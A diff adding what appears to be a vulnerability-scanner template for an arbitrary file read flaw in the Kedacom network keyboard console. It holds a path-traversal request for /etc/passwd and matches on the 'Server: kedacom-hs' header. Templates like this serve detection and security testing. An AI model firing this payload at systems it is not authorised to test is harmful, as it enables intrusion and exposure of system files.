@@ -1,0 +1,25 @@
+id: kedacom-network-lfi
+brief:
+    title: Kedacom Network Keyboard Console - Arbitrary File Read
+    by: DhiyaneshDk
+    level: high
+    about: There is an arbitrary file reading vulnerability in the KEDACOM network keyboard console. Attacking this vulnerability can read arbitrary information from the server
+    label:
+        - lfi
+        - kedacom
+        - network
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/../../../../../../../../etc/passwd'
+      signs:
+        - "on": word
+          has:
+            - text/html
+            - 'Server: kedacom-hs'
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
